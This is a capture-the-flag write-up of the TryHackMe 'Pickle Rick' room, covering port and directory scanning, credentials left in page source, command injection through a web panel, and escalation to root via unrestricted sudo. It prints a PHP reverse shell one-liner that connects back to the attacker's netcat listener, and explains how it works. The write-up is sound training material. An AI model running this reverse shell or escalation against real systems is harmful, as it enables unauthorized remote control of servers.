# Room Information

Room link: https://tryhackme.com/room/picklerick

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 6/26/2023

# Scanning and Enumeration
> Port Scanning Using Nmap 
1. Started up this room’s machine
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (**-sC**) and version detection (**-sV**) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.237.205 > PortScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 21:47 EDT
Nmap scan report for 10.10.237.205
Host is up (0.090s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 425ce2141719498f93765ab4df3162d2 (RSA)
|   256 c8c548584647f7b948b286c84d99e653 (ECDSA)
|_  256 88354fcc3adc12ae0e1e7e536be3fbb2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds
```

##
> Scanning for Hiddend Web Directory Using Dirb
4. `dirb http://{TARGET IP} -r /usr/share/dirb/wordlists/extensions_common.txt` to scan the target's web server for different types of files using Dirb's0 built in **extensions_common.txt** file, which reveals that there are .php and .phtml file present within the target's web server
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.237.205 /usr/share/dirb/wordlists/extensions_common.txt -r   

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jun 26 23:35:06 2023
URL_BASE: http://10.10.237.205/
WORDLIST_FILES: /usr/share/dirb/wordlists/extensions_common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 28                                                            

---- Scanning URL: http://10.10.237.205/ ----
+ http://10.10.237.205/.php (CODE:403|SIZE:291)   
+ http://10.10.237.205/.phtml (CODE:403|SIZE:293)   
+ http://10.10.237.205// (CODE:200|SIZE:1062)                                                   
                                                                               
-----------------
END_TIME: Mon Jun 26 23:35:09 2023
DOWNLOADED: 28 - FOUND: 3
```
5. `vim {FILENAME2}.txt` to create a new text file containing the file extensions that were found to be present in the target's web server
```bash
┌──(kali㉿kali)-[~]
└─$ vim Extensions.txt
```
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/extensions.txt.png)
6. `dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt` to non-recursively scan the target URL using the custom extensions wordlist we created and then redirect the results into a text file
7. `cat {FILENAME3}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.237.205 -x ~/Extensions.txt -r > WebDirectoryScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.237.205 -x ~/Extensions.txt -r 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jun 26 23:39:06 2023
URL_BASE: http://10.10.237.205/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive
EXTENSIONS_FILE: /home/kali/Extensions.txt | (.php)(.phtml) [NUM = 2]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.237.205/ ----
+ http://10.10.237.205/denied.php (CODE:302|SIZE:0)   
+ http://10.10.237.205/login.php (CODE:200|SIZE:882)     
+ http://10.10.237.205/portal.php (CODE:302|SIZE:0)                                                                                                                 
-----------------
END_TIME: Mon Jun 26 23:53:16 2023
DOWNLOADED: 9224 - FOUND: 3
```

##
> Reading the robots.txt File
8. `curl http://{TARGET IP}/robots.txt` to transfer and display the contents from the **robots.txt** file onto our terminal, which displayed a single string
```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.237.205/robots.txt
Wubbalubbadubdub
```

##
> Inspecting the Home Page
9. `curl http://{TARGET IP}` to transfer and display the contents from our target's web server's homepage onto our terminal, which revealed to us Rick's username
```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.237.205/          
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```

##
> Logging In
10. `firefox "http://{TARGET IP}/login.php"` to open Firefox and redirect it to the target's web server's **login.php** page and log in using Rick's username that we found and the string we found in the **robots.txt** file as his password, which successfully logged us in and brought us to a command panel
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/login.php.png)
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Command%20Panel%20-%20ls.png)


# Vulnerability Identification
> Command Injection
11. `ls` to list the available files and directories that are in the current directory that we're in
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Command%20Panel%20-%20ls.png)
12. `cat {SECRET INGREDIENT FILE1}.txt` to display the contents of the **Sup3rS3cretP1ckl3Ingred.txt** file, which ended up displayed an error saying the the command is disabled
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Command%20Disabled.png)
13. `sudo -l` to list the sudo privileges assigned to the user so that we can attempt to spawn a reverse shell, which turned out that the current user we're logged in as can ran any command as root
14. `php --version` to confirm that this server does in fact run PHP, which it does
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/php%20--version.png)
15. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"` to launch Firefox and redirect it to this Github repository containing commands that we potentially inject into the Command Panel to create a reverse shell

# Vulnerability Exploitation
> Reverse Shell
16. `nc -lnvp {PORT NUMBER}` to open up a Netcat listener on the specified unoccupied port on our attack machine
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
```
17. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");'` to establish a network socket connection to our attack machine on our active Netcal listener, and then execute the shell command to spawn in an interactive shell on that machine, which successfully connected back to our active Netcat listener and create a reverse shell
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Reverse%20Shell%20Payload.png)
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.6.54.63] from (UNKNOWN) [10.10.29.218] 53980
/bin/sh: 0: can't access tty; job control turned off
$ 
```
18. `ls` to list all the available files and directories that are in the current directory that we're in
19. `cat {SECRET INGREDIENT FILE1}.txt` to display the contents of the **Sup3rS3cretP1ckl3Ingred.txt** file, which displayed the first ingredient that we were looking for in this room
```bash
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php          
robots.txt
```
```bash       
$ cat Sup3rS3cretPickl3Ingred.txt               
mr. meeseek hair                                                                               
```
20. `pwd` to display where we currently are onto the terminal
```bash
$ pwd
/var/www/html
```
21. `ls /` to list the available files and directories that are in the filesystem's root directory
22. `ls /home` to list the available files and directories that are in the **/home** directory, which showed us two directories: **rick** and **ubuntu**
```bash
$ cd /home
```
```bash
$ ls
rick
ubuntu
```
23. `cd /home/rick` to change to the **/home/rick** directory
24. `ls` to list the available files and directories that are in the current directory that we're in, which showed us a **second ingredients** file
25. `cat '{SECRET INGREDIENT FILE2}.txt'` to display the contents of the **second ingredients** file onto our terminal, which displayed the second ingredient that we were looking for in this room
```bash
$ cd rick
```
```bash
$ ls
second ingredients
```
```bash
$ cat 'second ingredients'
1 jerry tear
```

# Post Exploitation
> Privilege Exploitation
26. `cd /root` to try to change to the **/root** directory since we couldn't find our third and last ingredient that's left to find for this room, which denied our request since we don't have the necessary privileges to access this directory
```bash
$ cd /root
/bin/sh: 1: cd: can't cd to /root
```
27. `sudo su` to switch to the root user, since we can do this without needing the root's password
28. `whoami` to verify that we're now running as root
29. `cd /root` to change to the **/root** directory, which we can now since we're running running with root privileges
30. `ls` to list the available files and directories that are in the current directory that we're in, which showed us a **3rd.txt** file
31. `cat {SECRET INGREDIENT FILE3}.txt` to display the contents of the **3rd.txt** file onto our terminal, which displayed the third and last ingredient that we were looking for in this room
```bash
$ sudo su
```
```bash
whoami
root
```
```bash
cd /root
```
```bash
ls
3rd.txt
snap
```
```bash
cat 3rd.txt
fleeb juice
```


**Room complete!**
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Pickle%20Rick.png)

# Command History
1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
2. `cat {FILENAME1}.txt`
3. `dirb http://{TARGET IP} -r /usr/share/dirb/wordlists/extensions_common.txt`
4. `dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt`
5. `vim {FILENAME2}.txt`
6. `cat {FILENAME3}.txt`
7. `curl http://{TARGET IP}/robots.txt`
8. `curl http://{TARGET IP}`
9. `firefox "http://{TARGET IP}/login.php"`
10. `ls`
11. `cat {SECRET INGREDIENT FILE1}.txt`
12. `sudo -l`
13. `php --version`
14. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"`
15. `nc -lnvp {PORT NUMBER}`
16. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");`
17. `ls`
18. `cat {SECRET INGREDIENT FILE1}.txt`
19. `pwd`
20. `ls /`
21. `ls /home`
22. `cd /home/rick`
23. `ls`
24. `cat '{SECRET INGREDIENT FILE2}.txt'`
25. ` cd /root`
26. `sudo su`
27. `cd /root`
28. `ls`
29. `cat {SECRET INGREDIENT FILE3}.txt`

# Dissecting Comands
`dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt`
+ `x {FILENAME2 WORDLIST PATH}` specifies a file that contains a list of file extensions to be used during the file and directory brute-forcing or enumeration process
+ `-r` specifies this to be a non recursive scan
+ `> {FILENAME3}.txt` redirects the output to the specified text file


`php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");`
+ `php -r` starts the PHP interpreter in "read and execute" mode, allowing us to run PHP code directly from the command line
+ `$sock=fsockopen("{MACHINE IP}", {PORT NUMBER})` creates a TCP/IP socket connection to the specified machine IP address and port number of our active Netcat listener using the **fsocketopen()** PHP function, and then storing the resulting command in the **$sock** variable
+ `exec("/bin/sh -i <&3 >&3 2>&3")` uses the exec() PHP function to execute the **/bin/sh -i <&3 >&3 2>&3** command on the target machine
     + `/bin/sh` is the path to the Bourne shell interpreter
     + `-i` makes the shell session interactive, allowing user input and otput
     + `<&3` redirects the stantard input (STDINT) of the shell to the socket connection in the **$sock** variable using the file descriptor 3
     + `>&3` redirects the stantard output (STDOUT) of the shell to the socket connection in the **$sock** variable using the file descriptor 3
     + `2>&3` redirects the standard error (STDERR) of the shell to the socket connection in the **$sock** variable using file descriptor 3

# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/
